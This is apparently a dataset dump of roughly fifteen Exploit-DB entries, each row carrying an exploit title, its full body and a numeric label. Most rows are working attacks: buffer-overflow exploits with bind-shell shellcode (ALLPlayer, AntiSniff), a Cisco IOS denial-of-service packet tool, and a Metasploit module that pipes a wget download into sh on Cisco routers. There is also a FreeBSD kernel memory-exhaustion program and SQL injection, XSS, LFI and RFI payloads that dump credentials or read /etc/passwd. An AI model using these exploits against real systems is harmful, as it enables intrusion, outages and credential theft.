42455,"ALLPlayer 7.4 - Local Buffer Overflow (SEH Unicode) #!/usr/bin/python # Exploit Title: ALL Player v7.4 SEH Buffer Overflow (Unicode) # Version: 7.4 # Date: 15-08-2017 # Exploit Author: f3ci # Tested on: Windows 7 SP1 x86  head = ""http://"" seh = ""\x0f\x47"" #0x0047000f nseh = ""\x61\x41"" #popad align junk = ""\x41"" * 301 junk2 = ""\x41"" * 45  #msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/unicode_mixed BufferRegister=EAX -f python #x86/unicode_mixed succeeded with size 782 (iteration=0) #Payload size: 782 bytes buf = """" buf += ""PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQ"" buf += ""AIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA"" buf += ""ZBABABABABkMAGB9u4JBkL7x52KPYpM0aPqyHeMa5pbDtKNpNPBk"" buf += ""QBjlTKaBkd4KD2mXzo87pJlfNQ9ovLOLs1cLIrnLMPGQfoZmyqI7"" buf += ""GrZRobnwRk1Bn0bknjOLDKPLkaQhGsNhzawaOa4KaIO0M1XSbka9"" buf += ""lXISmja9Rkp4TKM1FvMaYofLfaXOjmYqUw08wp0uJVJcqmYhmk3M"" buf += ""o4rUk41HTK28NDjaFsrFRklLPK4KaHklzaICTKytbkM1VpSYa4nD"" buf += ""NDOkaKaQ291JoaIoWpqOaOQJtKN2HkTMOmOxOCOBIpm0C8CGT3oB"" buf += ""OopTC80L2WNFzgyoz5Txf0ZaYpm0kyfdB4np38kycPpkypIoiEPj"" buf += ""kXqInp8bKMmpr010pPC8YZjoiOK0yohU67PhLBypjq1L3YzF1ZLP"" buf += ""aFaGPh7R9KoGBGKO8U271XEg8iOHIoiohUaGrH3DJLOK7qIo9EPW"" buf += ""eG1XBU0nnmc1YoYEC81SrMs4ip4IyS27ogaGnQjVaZn2B9b6jBkM"" buf += ""S6I7oTMTMliqkQ2m14nDN0UvKPndb4r0of1FNv0Fr6nn0VR6B31F"" buf += ""BH49FlmoTFyoIEbi9P0NPVq6YolpaXjhsWmMc0YoVuGKHpEe3rnv"" buf += ""QXVFce5mcmkOiEMlKV1lLJ3Pyk9PT5m5GKoWZsSBRO2JypPSYoxUAA""  #venetian ven = ""\x56""            #push esi ven += ""\x41""           #align ven += ""\x58""           #pop eax ven += ""\x41""           #align ven += ""\x05\x04\x01""   #add eax,01000400 ven += ""\x41""           #align ven += ""\x2d\x01\x01""   #add eax,01000100 ven += ""\x41""           #align ven += ""\x50""           #push eax ven += ""\x41""           #align ven += ""\xc3""           #ret  buffer = head + junk + nseh + seh + ven + junk2 + buf  print len(buffer) f=open(""C:\Users\Lab\Desktop\player.m3u"",'wb') f.write(buffer) f.close()",ALL Player,1
59,"Cisco IOS - IPv4 Packets Denial of Service /* * ShadowChode - Cisco IOS IPv4 Packet Processing Denial of Service Exploit * * Ping target router/switch for TTL to host. Subtract that number from 255 * and use that TTL on the command line. The TTL must equal 0 or 1 when it * reaches the target. The target must accept packets to the given target * interface address and there are some other caveats. * * BROUGHT TO YOU BY THE LETTERS C AND D * * [L0cK] */  #include <stdio.h> #include <sys/types.h>  #include ""libnet.h""  #define MIN_PAYLOAD_LEN (26)  #define CLEANUP { \ libnet_destroy(lh); \ free(payload); \ }  int main(int argc, char *argv[]) { char errbuf[LIBNET_ERRBUF_SIZE]; libnet_t *lh; u_long dst_addr; int ttl; int payload_len; char *payload; libnet_ptag_t data_tag; libnet_ptag_t ip_tag; int i; int len; int protocols[] = { 53, 55, 77, 103 }; struct libnet_stats ls;  lh = libnet_init(LIBNET_RAW4, NULL, errbuf);  if (lh == NULL) { (void) fprintf(stderr, ""libnet_init() failed: %s\n"", errbuf); exit(-1); }  if (argc != 3 || (dst_addr = libnet_name2addr4(lh, argv[1], LIBNET_RESOLVE) == -1)) { (void) fprintf(stderr, ""Usage: %s <target> <ttl>\n"", argv[0]); libnet_destroy(lh); exit(-1); }  { /* OH WAIT, ROUTE'S RESOLVER DOESN'T WORK! */ struct in_addr dst;  if (!inet_aton(argv[1], &dst)) { perror(""inet_aton""); libnet_destroy(lh); exit(-1); }  dst_addr = dst.s_addr; }  ttl = atoi(argv[2]);  libnet_seed_prand(lh);  len = libnet_get_prand(LIBNET_PR8);  /* Mmmmm, suck up random amount of memory! */  payload_len = (MIN_PAYLOAD_LEN > len) ? MIN_PAYLOAD_LEN : len;  payload = (char *) malloc(payload_len);  if (payload == NULL) { perror(""malloc""); libnet_destroy(lh); exit(-1); }  for (i = 0; i < payload_len; i++) { payload[i] = i; }  data_tag = LIBNET_PTAG_INITIALIZER;  data_tag = libnet_build_data(payload, payload_len, lh, data_tag);  if (data_tag == -1) { (void) fprintf(stderr, ""Can't build data block: %s\n"", libnet_geterror(lh)); CLEANUP; exit(-1); }  ip_tag = LIBNET_PTAG_INITIALIZER;  for (i = 0; i < 4; i++) { ip_tag = libnet_build_ipv4(LIBNET_IPV4_H + payload_len, 0, libnet_get_prand(LIBNET_PRu16),  0, ttl, protocols[i], 0, libnet_get_prand(LIBNET_PRu32), dst_addr, NULL, 0, lh, ip_tag);  if (ip_tag == -1) { (void) fprintf(stderr, ""Can't build IP header: %s\n"", libnet_geterror(lh)); CLEANUP; exit(-1); }  len = libnet_write(lh);  if (len == -1) { (void) fprintf(stderr, ""Write error: %s\n"", libnet_geterror(lh)); } }  libnet_stats(lh, &ls);  (void) fprintf(stderr, ""Packets sent: %ld\n"" ""Packet errors: %ld\n"" ""Bytes written: %ld\n"", ls.packets_sent, ls.packet_errors, ls.bytes_written);  CLEANUP;  return (0); }  // milw0rm.com [2003-07-18]",Cisco IOS,1
9396,"Facil Helpdesk - Local File Inclusion / Remote File Inclusion / Cross-Site Scripting /*                _____       _ ___        __                        | ____|_   _(_) \ \      / /_ _ _   _               |  _| \ \ / / | |\ \ /\ / / _` | | | |              | |___ \ V /| | | \ V  V / (_| | |_| |              |_____| \_/ |_|_|  \_/\_/ \__,_|\__, |                                               |___/                                      _____                                                        |_   _|__  __ _ _ __ ___                                         | |/ _ \/ _` | '_ ` _ \                                        | |  __/ (_| | | | | | |                                       |_|\___|\__,_|_| |_| |_|  Facil Helpdesk (RFI/LFI/XSS) Multiples Vulnerabilities  Discovered By : Moudi Contact : <m0udi@9.cn> Download : http://www.cromosoft.com/en/facilhelpdesk.html  Greetings : Mizoz, Zuka, str0ke, 599eme Man.  */  [+] Exploit XSS:  - Vulnerable code in kbase.php (/).  - Poc:   http://127.0.0.1/kbase.php/[XSS]   http://www.demo.cromosoft.com/helpdesk/kbase/kbase.php/""><script>alert(document.cookie);</script>  [+] Exploit LFI:  - Vulnerable code in index.php (lng).  - Poc:   http://127.0.0.1/index.php?lng=[LFI]   http://www.demo.cromosoft.com/helpdesk/index.php?lng=[LFI]  LFI => invalid../../../../../../../../../../etc/passwdxploit RFI:  - Vulnerable code in index.php (lng).  - Poc:   http://127.0.0.1/index.php?lng=[RFI]  # milw0rm.com [2009-08-07]",Facil Helpdesk,1
24701,"OpenWFE 1.4.x - Cross-Site Scripting / Connection Proxy source: https://www.securityfocus.com/bid/11514/info  OpenWFE is affected by a cross-site scripting and connection proxy vulnerability. These issues are due to a failure of the application to properly sanitize user-supplied input.  An attacker may leverage the cross-site scripting issue to steal cookie-based authentication credentials as well as carry out other attacks by executing client-based script code in an unsuspecting user's browser. An attacker may leverage the connection proxy issue to scan arbitrary network computers anonymously, facilitating further attacks.  To leverage the cross-site scripting issue: rmi://www.example.com:7080/workSessionServer""><script>alert(document.cookie)</script>  To leverage the connection proxy issue: rmi://<targetHostName>:<targetPort>/workSessionServer",OpenWFE,1
26501,"ActiveCampaign 1-2-All Broadcast Email 4.0 - Admin Control Panel 'Username' SQL Injection source: https://www.securityfocus.com/bid/15400/info  ActiveCampaign 1-2-All Broadcast Email is prone to an SQL-injection vulnerability. This is an input-validation issue related to data that will be used in SQL queries, allowing a remote user to influence the structure and logic of a query.  Successful attacks could compromise the software. Depending on the database implementation and the nature of the affected query, the attacker may be able to gain unauthorized access to the database.   http://www.example.com/[12allTarget]/admin/index.php  Username: ' or 1=1 /* Password: (Nothing)(Blank)",Broadcast Email,1
30398,"InstantCMS 1.10.3 - Blind SQL Injection Advisory ID: HTB23185 Product: InstantCMS Vendor: InstantSoft Vulnerable Version(s): 1.10.3 and probably prior Tested Version: 1.10.3 Advisory Publication:  November 20, 2013  [without technical details] Vendor Notification: November 20, 2013  Vendor Patch: November 21, 2013  Public Disclosure: December 11, 2013  Vulnerability Type: SQL Injection [CWE-89] CVE Reference: CVE-2013-6839 Risk Level: High  CVSSv2 Base Score: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P) Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered blind SQL injection vulnerability in InstantCMS, which can be exploited to perform SQL Injection attacks, alter SQL requests and compromise vulnerable application.    1) SQL Injection in InstantCMS: CVE-2013-6839  The vulnerability exists due to insufficient filtration of ""orderby"" HTTP POST parameter passed to ""/catalog/[id]"" URL. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.  Simple exploit code below uses blind SQL injection exploitation technique, and will display different order of records on the page if MySQL version is 5.*:   <form action=""http://[host]/catalog/2"" method=""post"" name=""main""> <input type=""hidden"" name=""orderby""  value=""(-pubdate*(substring(version(),1,1)=5))""> <input type=""hidden"" name=""orderto""  value=""asc""> <input type=""submit"" id=""btn""> </form>   -----------------------------------------------------------------------------------------------  Solution:  Apply patch for InstantCMS 1.10.3: http://www.instantcms.ru/download/patch/security_update_for_iCMS_1.10.3_21-11-2013.zip  InstantCMS 1.10.3 downloaded after 21/11/2013 is patched [without version/release modification] and is not vulnerable.  More Information: http://www.instantcms.ru/novosti/security-update-1-10-3.html http://trac.instantcms.ru/changeset/1376  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23185 - https://www.htbridge.com/advisory/HTB23185 - SQL Injection in InstantCMS. [2] InstantCMS - http://www.instantcms.ru/ - InstantCMS is a free open-source system for managing Internet communities and building social networking website. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® - http://www.htbridge.com/immuniweb/ - is High-Tech Bridge's proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",InstantCMS,1
46655,"Cisco RV320 and RV325 - Unauthenticated Remote Code Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = NormalRanking     include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::Remote::HttpServer::HTML   include Msf::Exploit::CmdStager    def initialize(info={})     super(update_info(info,       'Name'           => ""Cisco RV320 and RV325 Unauthenticated Remote Code Execution"",       'Description'    => %q{         This exploit module combines an information disclosure (CVE-2019-1653)         and a command injection vulnerability (CVE-2019-1652) together to gain         unauthenticated remote code execution on Cisco RV320 and RV325 small business         routers. Can be exploited via the WAN interface of the router. Either via HTTPS         on port 443 or HTTP on port 8007 on some older firmware versions.       },       'License'        => MSF_LICENSE,       'Author'         => [         'RedTeam Pentesting GmbH', # Discovery, Metasploit         'Philip Huppert',          # Discovery         'Benjamin Grap'            # Metasploit       ],       'References'     => [           [ 'CVE','2019-1653' ],           [ 'CVE','2019-1652' ],           [ 'EDB','46243' ],           [ 'BID','106728' ],           [ 'BID','106732' ],           [ 'URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export' ],           [ 'URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection' ]       ],       'Platform'       => 'linux',       'Targets'        =>         [          [ 'LINUX MIPS64',           {            'Platform' => 'linux',            'Arch'     => ARCH_MIPS64           }          ]         ],       'Payload'        =>         {          'BadChars' => """"         },       'CmdStagerFlavor' => [ 'bourne' ],       'Privileged'     => true,       'DisclosureDate' => ""Sep 9 2018"",       'DefaultTarget'  => 0))      register_options([       Opt::RPORT(8007), # port of Cisco webinterface       OptString.new('URIPATH', [true, 'The path for the stager. Keep set to default! (We are limited to 50 chars for the initial command.)', '/']),       OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 15]),       OptBool.new('USE_SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]) # Don't use 'SSL' option to prevent HttpServer from picking this up.     ])     deregister_options('SSL') # prevent SSL in HttpServer and resulting payload requests since the injected wget command will not work with '--no-check-certificate' option.     deregister_options('SSLCert') # not required since stager only uses HTTP.   end    def execute_command(cmd, opts = {})     # use generated payload, we don't have to do anything here   end    def autofilter     true   end    def on_request_uri(cli, req)     print_status(""#{peer} - Payload request received: #{req.uri}"")     @cmdstager = generate_cmdstager().join(';')     send_response(cli, ""#{@cmdstager}"")   end    def primer     payload_url = get_uri     print_status(""Downloading configuration from #{peer}"")     if(datastore['USE_SSL'])       print_status(""Using SSL connection to router."")     end     res = send_request_cgi({       'uri' => normalize_uri(""cgi-bin"",""config.exp""),       'SSL' => datastore['USE_SSL']     })     unless res       vprint_error('Connection failed.')       return nil     end      unless res.code == 200       vprint_error('Could not download config. Aborting.')       return nil     end      print_status(""Successfully downloaded config"")     username = res.body.match(/^USERNAME=([a-zA-Z]+)/)[1]     pass = res.body.match(/^PASSWD=(\h+)/)[1]     authkey = ""1964300002""     print_status(""Got MD5-Hash: #{pass}"")     print_status(""Loging in as user #{username} using password hash."")     print_status(""Using default auth_key #{authkey}"")     res2 = send_request_cgi({       'uri' => normalize_uri(""cgi-bin"",""userLogin.cgi""),       'SSL' => datastore['USE_SSL'],       'method' => 'POST',       'data' => ""login=true&portalname=CommonPortal&password_expired=0&auth_key=#{authkey}&auth_server_pw=Y2lzY28%3D&submitStatus=0&pdStrength=1&username=#{username}&password=#{pass}&LanguageList=Deutsch&current_password=&new_password=&re_new_password=""     })      unless res       vprint_error('Connection failed during login. Aborting.')       return nil     end      unless res.code == 200       vprint_error('Login failed with downloaded credentials. Aborting.')       return nil     end      #Extract authentication cookies     cookies = res2.get_cookies()     print_status(""Successfully logged in as user #{username}."")     print_status(""Got cookies: #{cookies}"")     print_status(""Sending payload. Staging via #{payload_url}."")     #Build staging command     command_string = CGI::escape(""'$(wget -q -O- #{payload_url}|sh)'"")     if(command_string.length <= 63)       print_status(""Staging command length looks good. Sending exploit!"")     else       vprint_error(""Warning: Staging command length probably too long. Trying anyway..."")     end      res3 = send_request_cgi({       'uri' => normalize_uri(""certificate_handle2.htm""),       'SSL' => datastore['USE_SSL'],       'method' => 'POST',       'cookie' => cookies,         'vars_get' => {          'type' => '4',         },         'vars_post' => {           'page' => 'self_generator.htm',                     'totalRules' => '1',                     'OpenVPNRules' => '30',                     'submitStatus' => '1',                     'log_ch' => '1',                     'type' => '4',                     'Country' => 'A',                     'state' => 'A',                     'locality' => 'A',                     'organization' => 'A',                     'organization_unit' => 'A',                     'email' => 'any@example.com',                     'KeySize' => '512',                     'KeyLength' => '1024',                     'valid_days' => '30',                     'SelectSubject_c' => '1',                     'SelectSubject_s' => '1'         },         'data' => ""common_name=#{command_string}""     })     unless res3       vprint_error('Connection failed while sending command. Aborting.')       return nil     end      unless res3.code == 200       vprint_error('Sending command not successful.')       return nil     end     print_status(""Sending payload timed out. Waiting for stager to connect..."")   end    def check     #Check if device is vulnerable by downloading the config     res = send_request_cgi({'uri'=>normalize_uri(""cgi-bin"",""config.exp"")})      unless res       vprint_error('Connection failed.')       return CheckCode::Unknown     end      unless res.code == 200       return CheckCode::Safe     end      unless res.body =~ /PASSWD/       return CheckCode::Detected     end      CheckCode::Vulnerable   end    def exploit     # Main function.     # Setting delay for the Stager.     Timeout.timeout(datastore['HTTPDELAY']) {super}   rescue Timeout::Error     print_status(""Waiting for stager connection timed out. Try increasing the delay."")   end end",Cisco,0
19918,"Stake AntiSniff 1.0.1/Researchers 1.0 - DNS Overflow (3) // source: https://www.securityfocus.com/bid/1207/info    Certain versions of @Stake Inc.'s Antisniffer software contain a remotely exploitable buffer overflow. AntiSniff is a program that was released by L0pht Heavy Industries in July of 1999. It attempts, through a number of tests, to determine if a machine on a local network segment is listening to traffic that is not directed to it (commonly referred to as sniffing). During one particular test there is a problem if a packet that does not adhere to DNS specifications is sent to the AntiSniff machine. This can result in a buffer overflow on the system running AntiSniff. If the packet is crafted appropriately this overflow scenario can be exploited to execute arbitrary code on the system.    This scenario is only possible if AntiSniff is configured to run the DNS test and only during the time the test is running. Nonetheless, it is a vulnerability that should not be ignored and has even been found in other promiscuous mode detection programs as well.    NOTE:    This information was taken verbatim from the L0pht advisory on the subject. This advisory is attached in full in the 'Credit' section of this advisory.    /* l0phtl0phe.c - antisniff exploit (1-1-1 ""second fixed version"" included)  *  * -scut/teso  *  * gcc -o l0phtl0phe l0phtl0phe.c -Wall -lnet `libnet-config --defines`  *  * description:  * l0pht messed up the fix for their problem in antisniff by not regarding  * the type signedness properties of the char and int values used. this  * results in a cool method bypassing the too extra checks (length + strncat).  * some work on this topic have been done by mixter, (bad results on type  * casting), but it should be obvious to any security conscious programmers.  * i'm not stating that they aren't allowed errors, but they should fix it  * for sure if they're going to fix it at all.  -sc.  *  * 2nd version: script kiddie proof to avoid that ""doesn't work"" lamer claim.  *  * greetings to all teso, lam3rz, hert, adm, w00w00 and lsd ppl.  */  #include <stdio.h> #include <stdlib.h> #include <netinet/in.h> #include <arpa/nameser.h> #include <libnet.h>   #define	OFFSET		0xbffef9a0  unsigned int	build_xp (unsigned char *xp);   int main (int argc, char *argv[]) { 	int		sock;		/* raw socket */ 	u_long		src_ip, 			dst_ip;  	unsigned char	xpbuf[1024];	/* this one gets complicated now */ 	unsigned char	tpack[2048];	/* paket buffer */ 	unsigned int	pl_len;   	if (argc != 3) { 		printf (""usage: %s <source ip> <dest ip>\n\n"", argv[0]);  		exit (EXIT_FAILURE); 	}  	sock = libnet_open_raw_sock (IPPROTO_RAW); 	if (sock == -1) { 		perror (""libnet_open_raw_sock""); 		exit (EXIT_FAILURE); 	}  	src_ip  = libnet_name_resolve (argv[1], 0); 	dst_ip  = libnet_name_resolve (argv[2], 0);  	pl_len = build_xp (xpbuf);  	libnet_build_ip (UDP_H + DNS_H + pl_len, 0, 7350, 0, 2, IPPROTO_UDP, 		src_ip, dst_ip, NULL, 0, tpack); 	libnet_build_udp (libnet_get_prand (PRu16), 53, NULL, 0, 		tpack + IP_H); 	libnet_build_dns (libnet_get_prand (PRu16), 0x0000, 1, 0, 0, 0, 		xpbuf, pl_len, tpack + IP_H + UDP_H); 	libnet_do_checksum (tpack, IPPROTO_UDP, UDP_H + DNS_H + pl_len);  	/* they use ""udp and dst port 53"" as bpf, so we should have no problem 	 */ 	libnet_write_ip (sock, tpack, UDP_H + IP_H + DNS_H + pl_len); 	libnet_close_raw_sock (sock);  	printf (""exploitation succeeded.\n""); 	printf (""try: \""telnet %s 17664\"" now.\n"", argv[2]);  	exit (EXIT_SUCCESS); }   /* build_xp  *  * build exploit buffer into buffer pointed to by `xp'.  */  unsigned int build_xp (unsigned char *xp) { 	int		i; 	unsigned char	buf[1024]; 	unsigned char	shellcode[] = 		/* portshell 17644 portshellcode by smiler & scut */ 		""\x31\xc0\xb0\x02\xcd\x80\x09\xc0\x74\x06\x31\xc0"" 		""\xfe\xc0\xcd\x80\xeb\x76\x5f\x89\x4f\x10\xfe\xc1"" 		""\x89\x4f\x0c\xfe\xc1\x89\x4f\x08\x8d\x4f\x08\xfe"" 		""\xc3\xb0\x66\xcd\x80\xfe\xc3\xc6\x47\x10\x10\x66"" 		""\x89\x5f\x14\x88\x47\x08\xb0\x45\x66\x89\x47\x16"" 		""\x89\x57\x18\x8d\x4f\x14\x89\x4f\x0c\x8d\x4f\x08"" 		""\xb0\x66\xcd\x80\x89\x5f\x0c\xfe\xc3\xfe\xc3\xb0"" 		""\x66\xcd\x80\x89\x57\x0c\x89\x57\x10\xfe\xc3\xb0"" 		""\x66\xcd\x80\x31\xc9\x88\xc3\xb0\x3f\xcd\x80\xfe"" 		""\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x31"" 		""\xd2\x88\x57\x07\x89\x7f\x0c\x89\xfb\x8d\x4f\x0c"" 		""\xb0\x0b\xcd\x80\x31\xc0\x99\x31\xdb\x31\xc9\xe8"" 		""\x7e\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"";  	unsigned char	head[] = 		""\x07-7350-\x00\xfe"";  	memcpy (buf, head, 9); 	for (i = 9 ; i < (sizeof (buf) - strlen (shellcode)) ; ++i) 		buf[i] = '\x90'; 	memcpy (buf + sizeof (buf) - strlen (shellcode), shellcode, 		strlen (shellcode));  	buf[272] = '\xeb'; 	buf[273] = '\x08'; 	buf[274] = (OFFSET      ) & 0xff; 	buf[275] = (OFFSET >>  8) & 0xff; 	buf[276] = (OFFSET >> 16) & 0xff; 	buf[277] = (OFFSET >> 24) & 0xff;  	memcpy (xp, buf, sizeof (buf));  	return (sizeof (buf));; }",Stake AntiSniff,1
5483,"TR News 2.1 - 'nb' SQL Injection ######################################################## #                                                      #  #  Discovered by : His0k4 {Algerian HaCker}            # #                                                      # #  Email : His0k4.hlm[at]gmail[dot]com                 # #                                                      # #  Greetz to: All Dz & muslims HaCkeRs  :)               # #                                                      # #  Special Greetz:c02,Spym4n,THe-MooRiSH               # #                                                      # ######################################################## # #  Script   : Tr Script News v2.1 # #  Download script     : http://www.easy-script.com/scripts-dl/trscript-21.zip # #  Dork        : inurl:news.php?mode=voir # #  Vulnerable file    : news.php # #  P.O.C #  http://www.victime.com/[news_path]/news.php?mode=voir&nb=[SQL] #  #  Exemple: #  http://www.victime.com/[news_path]/news.php?mode=voir&nb=-1/**/UNION/**/SELECT/**/1,2,3,4,concat_ws(0x3a,pseudo,pass,email),6,7/**/from/**/tr_user_news/* # #  Admin login: /admin # #  Note: you can upload a shell from the administrator board by going in this link ""/admin/main.php?mode=ajout_cat"" and it will be uploaded in ""[news_path]/images/icone_cat/shell.php"" # #############################################################################  # milw0rm.com [2008-04-21]",TR News,1
7515,"phpclanwebsite 1.23.3 fix pack #5 - Multiple Vulnerabilities Phpclanwebsite <= 1.23.3 Fix Pack #5 (File Including/SQL/XSS) Multiple Remote Vulnerabilities  The description: The set vulnerability in CMS Phpclanwebsite versions 1.23.3 Fix Pack #5 and more low was revealed.  1. Multiple File Including Vulnerabilities  Vulnerability exists for the reason that direct access to some files, around logicians of work of the appendix is possible. It gives the chance to redefine internal variables which are transferred as arguments in function include (). Examples of vulnerable files: /theme/superchrome/box.php?boxname=../../../../../etc/passwd%00 /phpclanwebsite/footer.php?theme=../../../../../etc/passwd%00 etc  The note: For vulnerability operation the following options PHP are required: register_globals=On and magic_quotes_gpc=Off  2. Multiple SQL Injection Vulnerabilities  The appendix everywhere does not check the variables transferred from outside of the user. It allows to carry out any SQL Injection. Examples of vulnerable files: SQL Injection (insert) -  /index.php?page='SQL SQL Injection (delete) -  /index.php?page=processforms&ok=1&SP=1&form_id=2  , where ""form_id"" the identifier of the deleted user SQL Injection (select) -  /index.php?page=login  POST:pcwlogin='SQL&pcw_pass='SQL   /index.php?page=login  POST:pcwlogin=1'+OR+1=1--&pcw_pass=1  SQL Injection (select) -  /index.php?page=downloads&func=search  POST:searchvalue='SQL&whichfield=SQL   /index.php?page=downloads&func=search  POST:searchvalue=1&whichfield=dl_name>1)+limit+0+union+select+tag,2,3,login,5,6,7,email,9,password,11,12,13,14,15+from+cws_members-- etc  The note: For operation of all SQL Injection vulnerabilities, except vulnerability in parametre ""whichfield"", are required disconnected magic_quotes_gpc.  3. Multiple Cross-site Scripting Vulnerabilities  The appendix everywhere does not check the variables transferred from outside of the user. It allows to carry out any code in a context of a user browser. Examples of vulnerable files: /index.php?page='><script>alert('XSS')</script> etc  # milw0rm.com [2008-12-18]",phpclanwebsite,1
10729,"Joomla! Component com_adagency - Local File Inclusion         \\\|///       \\  - -  //        (  @ @ ) ----oOOo--(_)-oOOo--------------------------- @~~=Author   : Fl0riX  @~~=Greez  : Deep-Power ,Pyske & All Friends ---------------Ooooo-------------------------                (   )       ooooO     ) /       (   )    (_/        \ (         \_)  @~~=======================================~~@ @~~=Script   : Joomla Component com_adagency  @~~=S.Site   : www.ijoomla.com<http://www.ijoomla.com/>    @~~=======================================~~@  @~~=Vuln               : http://server/index.php?option=com_adagency&controller= [-LFI-]                                                   / ___ \   \  \   \ \ /\    /  /                                              / /   \/    \  \  /  \  \  /  /                                              | |          \  \/  / \  \/  /                                              | \    __     \    /   \    /                                              \  \__/ /      \  /     \  /                                               \_____/        \/       \/",Joomla! Component com_adagency,1
2235,PHProjekt 6.1 - 'path_pre' Multiple Remote File Inclusions ######################################################################## #  Content management module for PHProjekt v0.6.1  Remote File Inclusion Vulnerability # #  Download: http://www.mariovaldez.net/software/cm_4p/files/cm4p_0.6.1.tar.gz # #  Found By: the master # ######################################################################## #  exploit: # #  http://[Target]/[Path]/cm_navigation-33.inc.php?path_pre=http://cmd.gif? #  http://[Target]/[Path]/cm_navigation.inc.php?path_pre=http://cmd.gif? #  http://[Target]/[Path]/cm_summary.inc.php?path_pre=http://cmd.gif? ########################################################################  # milw0rm.com [2006-08-21],PHProjekt,1
19505,"FreeBSD 3.0/3.1/3.2 - 'vfs_cache' Denial of Service // source: https://www.securityfocus.com/bid/653/info  A vulnerability exists in FreeBSD's new VFS cache introduced in version 3.0 that allows a local and possibly remote user to force the kernel to consume large quantities of wired memory thus creating a denial of service condition. The new VFS cache has no way to purge entries from memory while the file is open, consuming wired memory and allowing for the denial of service (memory that cannot be swapped out).  FreeBSD versions earlier than 3.0 are not vulnerable, nor is the original 4.4BSD-Lite code.   #include <stdio.h> #include <unistd.h> #include <sys/stat.h>  #define	NFILE	64 #define	NLINK	30000 #define	NCHAR	245  int main() { 	char junk[NCHAR+1], 	     dir[2+1+2+1], file1[2+1+2+1+NCHAR+3+1], file2[2+1+2+1+NCHAR+3+1]; 	int i, j; 	struct stat sb;  	memset(junk, 'x', NCHAR); 	junk[NCHAR] = '\0'; 	for (i = 0; i < NFILE; i++) { 		printf(""\r%02d/%05d..."", i, 0), 		fflush(stdout); 		sprintf(dir, ""%02d-%02d"", i, 0); 		if (mkdir(dir, 0755) < 0) 			fprintf(stderr, ""mkdir(%s) failed\n"", dir), 			exit(1); 		sprintf(file1, ""%s/%s%03d"", dir, junk, 0); 		if (creat(file1, 0644) < 0) 			fprintf(stderr, ""creat(%s) failed\n"", file1), 			exit(1); 		if (stat(file1, &sb) < 0) 			fprintf(stderr, ""stat(%s) failed\n"", file1), 			exit(1); 		for (j = 1; j < NLINK; j++) { 			if ((j % 1000) == 0) { 				printf(""\r%02d/%05d..."", i, j), 				fflush(stdout); 				sprintf(dir, ""%02d-%02d"", i, j/1000); 				if (mkdir(dir, 0755) < 0) 					fprintf(stderr, ""mkdir(%s) failed\n"", dir), 					exit(1); 			} 			sprintf(file2, ""%s/%s%03d"", dir, junk, j%1000); 			if (link(file1, file2) < 0) 				fprintf(stderr, ""link(%s,%s) failed\n"", file1, file2), 				exit(1); 			if (stat(file2, &sb) < 0) 				fprintf(stderr, ""stat(%s) failed\n"", file2), 				exit(1); 		} 	} 	printf(""\rfinished successfully\n""); }",FreeBSD's,1
4432,"Sun jre1.6.0_X - isInstalled.dnsResolve Function Overflow <html> <body> <center> Sun (jre1.6.0_X) isInstalled.dnsResolve function overflow PoC<br> Bug founded and code released by Yag Kohha. <br> Greetz to: <br> Shinnai, Str0ke <br>  </center> <object classid=""CLSID:5852F5ED-8BF4-11D4-A245-0080C6F74284"" id=""target""></OBJECT> <SCRIPT language=""javascript""> var b = 'XXXX'; while (b.length <= 512*512) b+=b; target.dnsResolve(b); </script> </body> </html>  # milw0rm.com [2007-09-19]",Sun jre1.6.0_X,0
7041,"E-topbiz Online Store 1 - Authentication Bypass E-topbiz Online Store 1 (Auth Bypass) SQL Injection Vulnerability  author: ZoRLu  msn: trt-turk@hotmail.com  Home: www.z0rlu.blogspot.com  N0T: YALNIZLIK, YiTiRDi ANLAMINI YALNIZLIGIMDA : (   ( bIktIm a.q )  Exploit:  username: [real_admin_name] ' or ' 1=1  password: ZoRLu  note: generally admin name: admin    for demo:   http://e-topbiz.com/trafficdemos/store1/admin/login.php  username: admin ' or ' 1=1--  password: ZoRLu   thanks: str0ke & yildirimordulari.org  &  darkc0de.com  # milw0rm.com [2008-11-07]",E-topbiz Online Store,1
